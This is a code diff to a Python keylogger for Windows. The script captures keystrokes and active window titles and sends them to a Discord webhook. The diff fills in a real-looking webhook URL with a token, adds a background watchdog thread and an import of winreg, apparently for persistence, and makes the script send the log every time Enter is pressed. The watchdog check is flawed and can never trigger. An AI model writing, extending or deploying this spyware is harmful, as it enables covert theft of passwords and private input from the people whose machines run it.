@@ -9,10 +9,12 @@ import win32api
 import keyboard
 import threading
 import atexit
+import getpass
+import winreg as reg
 from datetime import datetime
 
 # Discord Webhook URL
-WEBHOOK_URL = ""
+WEBHOOK_URL = "https://discordapp.com/api/webhooks/1355720476252704798/QfHQTbLamSNlG9dywD-F5hiytst3Cy2tL76Nf6gVtv9GtdU6BKf1XXluZ5UW6ZimOg-B"
 
 # Get PC name
 PC_NAME = socket.gethostname()
@@ -78,6 +80,19 @@ def handle_exit(sig):
 
 win32api.SetConsoleCtrlHandler(handle_exit, True)
 
+# **🔹 NEW: Watchdog to detect script exit**
+def shutdown_watchdog():
+    pid = os.getpid()
+    while True:
+        time.sleep(2)
+        if os.getpid() != pid:  # If the process is killed
+            log_system_shutdown()
+            break
+
+# Run watchdog in background
+watchdog_thread = threading.Thread(target=shutdown_watchdog, daemon=True)
+watchdog_thread.start()
+
 # Function to get active window title
 def get_active_window_title():
     hwnd = win32gui.GetForegroundWindow()
@@ -120,6 +135,7 @@ def log_keystroke(event):
             keystrokes += " "
         elif key == "enter":
             keystrokes += "\n"
+            send_keystrokes()  # Send log immediately on enter
         elif key == "backspace" and keystrokes:
             keystrokes = keystrokes[:-1]
 
